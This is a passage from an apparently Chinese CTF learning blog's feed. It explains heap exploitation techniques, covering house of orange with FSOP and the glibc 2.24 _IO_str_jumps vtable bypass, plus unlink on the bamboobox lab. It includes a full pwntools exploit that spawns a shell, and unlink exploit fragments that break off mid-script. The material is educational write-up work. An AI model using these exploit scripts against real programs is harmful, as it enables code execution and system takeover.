FILE的伪unsorted bin结构里，size=0）会触发malloc printer（就是那个malloc错误）这个时候就会去调用IO_list_all那个系列的函数</p><p>在IO_FILE结构体中，偏移0x60的字段是struct _IO_marker *_markers，偏移0x68的字段是struct _IO_FILE *_chain。而这两个的值恰恰是old_top的起始地址。</p></blockquote><p>　　原来改为0x60是为了将<code>old_top</code>加入<code>smallbin[4]</code>，而<code>smallbin[4]的fd和bk指针</code>恰好对应于<code>IO_FILE</code>结构体中的<code>_markers</code>和<code>_chain</code>字段。就能跳转至我们的<code>old_top</code>了</p><h4 id="实现FSOP的调试"><a href="#实现FSOP的调试" class="headerlink" title="实现FSOP的调试"></a>实现FSOP的调试</h4><p>在malloc最后一个堆块前我们去gdb里在<code>_int_malloc</code>看一下调用</p><p>出现error的字样时，chunk被写进<code>smallbin[4]</code></p><p><img src="/2020/03/10/house-of-orange/2.png" alt></p><p>此时的<code>IO_FILE</code>进入<code>main_arena</code></p><p><img src="/2020/03/10/house-of-orange/3.png" alt></p><p>此时chain的值为<code>fack_chunk</code>的地址，即<code>old_top</code></p><p><img src="/2020/03/10/house-of-orange/4.png" alt><br>(这里是第二种绕过方式的截图)</p><p>old_top里面chain为0，则往vtable执行</p><h3 id="house-of-orange在glibc2-24下的利用"><a href="#house-of-orange在glibc2-24下的利用" class="headerlink" title="house of orange在glibc2.24下的利用"></a>house of orange在glibc2.24下的利用</h3><p>glibc2.24开始引入vtable 的检测函数—— <code>IO_validate_vtable</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vtable需要满足的条件：</p><blockquote><p>在 <strong>stop_</strong>IO_vtables 和 <strong>start_</strong>libc_IO_vtables 之间</p></blockquote><p>而我们伪造的vtable通常不满足这个条件，但是可以找到 ==<strong>IO_str_jumps== 符合条件。（接下来就分析利用</strong>IO_str_jumps的绕过）</p><p>__IO_str_jumps 结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们利用<code>_IO_str_finish</code>进行接下来的绕过和利用</p><p>其源码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void _IO_str_finish (FILE *fp, int dummy)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    // call qword ptr [fp+0E8h]</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); </span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以知道绕过的条件是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags= 0</span><br><span class="line">fp-&gt;_IO_buf_base = binsh_addr</span><br></pre></td></tr></table></figure><p>此时我们使vtable存放指向<code>_IO_str_jumps - 8</code>处的指针 ，这样调用<code>_IO_overflow</code>时会调用到<code>_IO_str_finish</code></p><p>不过，由于<code>_IO_str_jumps</code>不在符号表内，所以只能通过其他函数来间接得到它的地址，例如<code>_IO_str_underflow</code>，我们已知<font color="red">_IO_str_jumps 的地址大于_IO_file_jumps 地址</font>，可以用此来确认_IO_str_underflow的地址，并且<code>_IO_str_underflow</code>=<code>_IO_str_jummps+0x20</code></p><p>然后我在<a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">大佬的博客</a>里看到一个特别6的方法可以直接算出偏移（不用手算！）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="keyword">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>因为满足了if之后，会<code>call qword ptr [fp+0E8h]</code></p><p>所以我们使</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp+0xe8 = system_addr</span><br></pre></td></tr></table></figure><p>就可以实现getshell了</p><p>这个方法在glibc 2.23和glibc 2.24里都适用</p><p>所以我们用上面那题来试一下这个方法，运用了大佬微博里自定义的的封装函数，构造我们的exp，然后就发现我们getshell成功了</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import*</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,name,price,color):</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;name :&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;Name :&quot;)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;name :&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file(_flags = 0,</span><br><span class="line">              _IO_read_ptr = 0,</span><br><span class="line">              _IO_read_end = 0,</span><br><span class="line">              _IO_read_base = 0,</span><br><span class="line">              _IO_write_base = 0,</span><br><span class="line">              _IO_write_ptr = 0,</span><br><span class="line">              _IO_write_end = 0,</span><br><span class="line">              _IO_buf_base = 0,</span><br><span class="line">              _IO_buf_end = 0,</span><br><span class="line">              _IO_save_base = 0,</span><br><span class="line">              _IO_backup_base = 0,</span><br><span class="line">              _IO_save_end = 0,</span><br><span class="line">              _IO_marker = 0,</span><br><span class="line">              _IO_chain = 0,</span><br><span class="line">              _fileno = 0,</span><br><span class="line">              _lock = 0,</span><br><span class="line">              _wide_data = 0,</span><br><span class="line">              _mode = 0):</span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(0) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(0xc0, &apos;\x00&apos;)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)</span><br><span class="line">    return file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):</span><br><span class="line">    payload = pack_file(_flags = 0,</span><br><span class="line">                        _IO_read_ptr = 0x61, #smallbin4file_size</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,</span><br><span class="line">                        _IO_write_base = 0,</span><br><span class="line">                        _IO_write_ptr = 1,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = 0,</span><br><span class="line">                        )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr-8)</span><br><span class="line">    payload += p64(0) # paddding</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">add(0x10,&apos;aaaa&apos;,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">upgrade(0x40,&apos;a&apos;*0x10+p64(0)+p64(0x21)+&apos;a&apos;*0x10+p64(0)+p64(0xfa1),32,1)</span><br><span class="line"></span><br><span class="line">add(0xfb0,&apos;aaaa&apos;,32,1) #in unsorted bin list</span><br><span class="line"></span><br><span class="line">add(0x400,&apos;b&apos;*8,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;b&apos;*8)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 1640</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;b&apos;*0x10,32,1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&apos;b&apos;*0x10)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[&apos;_IO_list_all&apos;] + libc_base</span><br><span class="line">system = libc.symbols[&apos;system&apos;] + libc_base</span><br><span class="line">binsh_addr = next(libc.search(&quot;/bin/sh&quot;)) + libc_base</span><br><span class="line">IO_file_jumps_offset = libc.sym[&apos;_IO_file_jumps&apos;]</span><br><span class="line">IO_str_underflow_offset = libc.sym[&apos;_IO_str_underflow&apos;]</span><br><span class="line">for ref_offset in libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - 0x20</span><br><span class="line">    if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        print possible_IO_str_jumps_offset</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">_IO_str_jumps_addr=libc_base + possible_IO_str_jumps_offset</span><br><span class="line">print hex(_IO_str_jumps_addr)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)</span><br><span class="line">file = pack_file_flush_str_jumps(_IO_str_jumps_addr,_IO_list_all,system,binsh_addr)</span><br><span class="line">pay+=file</span><br><span class="line">upgrade(0x800,pay,32,2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>　　</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.anquanke.com/post/id/85127" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85127</a><br><a href="https://bbs.pediy.com/thread-251195.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251195.htm</a><br><a href="https://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="noopener">https://www.cnblogs.com/shangye/p/6268981.html</a><br><a href="https://www.jianshu.com/p/4b0a73f321f9" target="_blank" rel="noopener">https://www.jianshu.com/p/4b0a73f321f9</a><br><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></p><p>　　</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。&lt;/p&gt;
&lt;h3 id=&quot;对于house-of-orange操作的理解（glibc2-23）&quot;&gt;&lt;a href=&quot;#对于house-of-orange操作的理解（glibc2-23）&quot; class=&quot;headerlink&quot; title=&quot;对于house of orange操作的理解（glibc2.23）&quot;&gt;&lt;/a&gt;对于house of orange操作的理解（glibc2.23）&lt;/h3&gt;&lt;p&gt;大体上是，没有&lt;font color=&quot;red&quot;&gt;free&lt;/font&gt;函数，通过&lt;font color=&quot;red&quot;&gt;改写top chunk&lt;/font&gt;，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://c0yo7e.github.io/2020/02/18/unlink/"/>
    <id>https://c0yo7e.github.io/2020/02/18/unlink/</id>
    <published>2020-02-18T14:44:29.000Z</published>
    <updated>2020-08-02T05:13:50.774Z</updated>
    
    <content type="html"><![CDATA[<p>把ctf wiki里的unlink题简单的做了一下<br>先简单的记录一下，以后吃透了再回来好好的填填坑</p><p>理解了一下unlink的操作<br>就是构造一个chunk，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1302000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x1302010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000040</span>  <span class="comment">#fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11</span></span><br><span class="line"><span class="number">0x1302020</span>:<span class="number">0x00000000006030d0</span><span class="number">0x00000000006030d8</span></span><br><span class="line"><span class="number">0x1302030</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302040</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302050</span>:<span class="number">0x0000000000000040</span><span class="number">0x00000000000000a0</span>  <span class="comment">#p位改成0，free下一个chunk之后会与上一个chunk合并</span></span><br><span class="line"><span class="number">0x1302060</span>:<span class="number">0x654420746f626f52</span><span class="number">0x00000000006c6976</span></span><br><span class="line"><span class="number">0x1302070</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302090</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020f11</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Hitcon-training-lab11-bamboobox"><a href="#Hitcon-training-lab11-bamboobox" class="headerlink" title="Hitcon-training lab11 bamboobox"></a>Hitcon-training lab11 bamboobox</h2><p>unlink的很重要一个条件就是已知存储各个堆块地址的位置。</p><p>unlink操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>) <span class="comment">#chunk0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'bbbbbb'</span>) <span class="comment">#chunk1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccc'</span>) <span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fack chunk（构造成被free掉的样子</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">pay += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line">remove(<span class="number">1</span>)  <span class="comment">#free chunk1，使chunk1往前合并,触发unlink</span></span><br></pre></td></tr></table></figure><p>则chunk0就变成了发错fack_chunk里面的fd和bk，所指向的target<br>改target的内容为我们想覆写的一个got表地址，这样show的时候也可以leak出libc来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+ p64(<span class="number">0x80</span>) + p64(<span class="number">0x602068</span>) <span class="comment">#把atoi的got表地址覆写成chunk0里面</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">"0 : "</span>) </span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) </span><br><span class="line"><span class="keyword">print</span> hex(atio_addr)</span><br><span class="line">libc_base=atoi_addr<span class="number">-0x36E80</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x8</span>,p64(one_gadget)) <span class="comment">#把atoi got表里的内容改为one gadget</span></span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span 